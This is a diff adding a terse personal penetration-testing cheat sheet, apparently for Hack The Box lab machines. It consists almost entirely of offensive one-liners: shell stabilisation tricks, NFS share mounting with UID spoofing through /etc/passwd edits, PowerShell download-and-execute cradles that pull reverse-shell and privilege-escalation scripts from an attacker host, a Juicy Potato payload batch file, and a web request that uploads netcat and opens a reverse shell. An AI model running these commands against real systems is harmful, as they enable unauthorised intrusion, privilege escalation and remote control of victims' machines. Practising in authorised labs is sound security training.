@@ -1,1 +1,48 @@
+Interactive Shell:
+python -c 'import pty;pty.spawn("/bin/bash")'
+or
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+env | grep TERM
+export  TERM=xterm-256color
+cltr z
+stty raw -echo
+fg enter
 
+Mount: 
+showmount -e 10.10.10.180
+
+mkdir nsf2
+
+sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/Documents/HTB/Machines/Remote/nfs2/
+
+// we can also create user and make its UUID which can read the files from the mounted server,
+
+Add User:
+sudo adduser pwn
+
+Change UUID to the target server UUID:
+sudo sed -i -e 's/1001/1014/g' /etc/passwd (The -i option is used to replace the file in-place and the -e option executes a script)
+
+// su to the newly added pwn user
+su pwn
+
+
+File Transfer:
+HTTP Server
+sudo python -m SimpleHTTPServer 80  
+sudo python3 -m http.server 80
+
+wget http://10.10.10.168:80/LinEnum.sh
+
+powershell "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.30/rev.ps1')"
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.30/PowerSploit/Privesc/PowerUp.ps1') 
+
+Juicy potato execution (see Bart writeup)
+ echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/shell.ps1')" > shell.bat 
+ 
+(new-object net.webclient).downloadfile('http://10.10.14.5/shell.bat', 'C:\Users\Public\Downloads\shell.bat')
+
+
+Look at the “php” code for reference,
+http://10.10.10.9/red.php?fupload=nc64.exe&fexec=nc64.exe%20-e%20cmd%2010.10.14.30%208081
